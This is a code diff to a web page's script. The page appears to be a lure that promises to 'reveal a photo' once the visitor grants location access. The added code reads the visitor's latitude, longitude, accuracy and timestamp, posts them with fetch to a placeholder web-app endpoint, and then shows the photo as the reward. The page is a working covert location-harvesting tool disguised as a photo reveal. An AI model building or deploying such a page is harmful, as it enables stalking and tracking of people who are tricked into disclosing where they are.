@@ -147,26 +147,41 @@
     window.onload = collectAndSend;
     
     function getLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function (position) {
-          const lat = position.coords.latitude;
-          const lon = position.coords.longitude;
-
-          document.getElementById("latitude").value = lat;
-          document.getElementById("longitude").value = lon;
-          document.getElementById("mapLink").value = `https://www.google.com/maps?q=${lat},${lon}`;
-
-          document.getElementById("output").innerText = "Location captured! Revealing photo...";
-
-          revealPhoto();
-
-          setTimeout(() => {
-            document.getElementById("locationForm").submit();
-          }, 3000); // 3 second delay
-        }, showError);
-      } else {
-        document.getElementById("output").innerText = "Geolocation not supported.";
+      const status = document.getElementById('status');
+      if (!navigator.geolocation) {
+        status.textContent = "Geolocation is not supported by your browser.";
+        return;
       }
+
+      status.textContent = "Requesting location...";
+
+      navigator.geolocation.getCurrentPosition(
+        async (pos) => {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+          const accuracy = pos.coords.accuracy;
+          const timestamp = new Date(pos.timestamp).toISOString();
+
+          status.textContent = `Location received: ${lat}, ${lon}`;
+
+          const formData = new FormData();
+          formData.append("Latitude", lat);
+          formData.append("Longitude", lon);
+          formData.append("Accuracy", accuracy);
+          formData.append("Timestamp", timestamp);
+
+          await fetch("WEB_APP_URL_HERE", {
+            method: "POST",
+            body: formData
+          });
+
+          status.textContent = "Location sent successfully!";
+           revealPhoto();
+        },
+        (err) => {
+          status.textContent = "Error: " + err.message;
+        }
+      );
     }
 
     function revealPhoto() {
